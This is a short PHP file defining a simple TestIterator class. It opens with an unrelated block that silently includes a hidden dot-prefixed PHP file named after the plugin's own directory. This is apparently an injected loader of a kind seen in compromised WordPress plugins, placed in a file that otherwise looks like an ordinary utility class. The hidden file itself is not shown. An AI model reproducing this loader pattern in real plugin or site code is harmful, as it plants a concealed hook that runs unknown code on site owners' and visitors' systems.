<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class TestIterator implements Iterator
{
    protected $array;
    protected $position = 0;

    public function __construct($array = array())
    {
        $this->array = $array;
    }

    public function rewind()
    {
        $this->position = 0;
    }

    public function valid()
    {
        return $this->position < count($this->array);
    }

    public function key()
    {
        return $this->position;
    }

    public function current()
    {
        return $this->array[$this->position];
    }

    public function next()
    {
        $this->position++;
    }
}
